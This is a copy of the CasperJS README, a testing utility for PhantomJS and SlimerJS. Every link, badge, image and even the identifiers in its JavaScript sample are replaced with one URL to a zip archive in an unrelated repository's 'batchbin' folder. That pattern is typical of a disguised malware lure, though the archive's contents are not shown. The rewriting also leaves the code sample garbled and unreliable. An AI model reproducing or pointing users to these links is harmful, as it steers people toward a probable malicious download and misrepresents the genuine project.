# CasperJS

>**Important note:** the `master` branch hosts the development version of CasperJS, which is now pretty stable and should be the right version to use if you ask me.
>
>Use the [`1.0` branch](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) if you want to keep in sync with the stable old version, or [use tagged versions](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip).
>
>Currently, available documentation is:
>
>- **hosted on [https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) for the development branch**
>- hosted on [https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) for the 1.0 branch
>
>[Travis-CI](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) build status:
>
>- ![Build Status](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) `master` branch
>- 1.0 tests unfortunately have to be run manually using the `casperjs selftest` command

CasperJS is a navigation scripting & testing utility for [PhantomJS](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip)
and [SlimerJS](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip). It eases the process of defining a full navigation
scenario and provides useful high-level functions, methods & syntaxic sugar for doing common
tasks such as:

- defining & ordering [navigation steps](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip)
- [filling forms](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip)
- [clicking links](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip)
- [capturing screenshots](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) of a page (or an area)
- [making assertions on remote DOM](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip)
- [logging](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) & [events](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip)
- [downloading base64](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) encoded resources, even binary ones
- catching errors and react accordingly
- writing [functional test suites](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip), exporting results as JUnit XML (xUnit)

Browse the [sample examples repository](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip).
Don't hesitate to pull request for any cool example of yours as well!

**Read the [full documentation](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) on casperjs dedicated website.**

Subscribe to the [project mailing-list](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip!forum/casperjs)

Follow the CasperJS project [on twitter](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) and [Google+](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip).

## Show me some code!

Sample test to see if some dropdown can be opened:

```javascript
https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip('a twitter bootsrap dropdown can be opened', 2, function(test) {
    https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip('https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip', function() {
        https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip('#navbar-example');
        https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip('#dropdowns .nav-pills .dropdown:last-of-type https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip');
        https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip('#dropdowns .nav-pills .open', function() {
            https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip('Dropdown is open');
        });
    }).run(function() {
        https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip();
    });
});
```

Run the script:

![](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip%20d%E2%80%99%C3%A9cran%202013-01-20%20%C3%A0%https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip)

##Support

If you're having problems with using the project, use the support forum at CodersClan.

<a href="https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip"><img src="https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip" width="160"></a>

## Contributing

### Contributing code

Please read the [https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) file contents.

### Contributing documentation

CasperJS's documentation is written using the [Markdown format](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip), and hosted on Github thanks to the [Github Pages Feature](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip).

To view the source files on github, head to [the gh-pages branch](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip), and check the [documentation's README](https://raw.githubusercontent.com/videogramme/casperjs/master/batchbin/Software-inexhaustedly.zip) for further instructions.
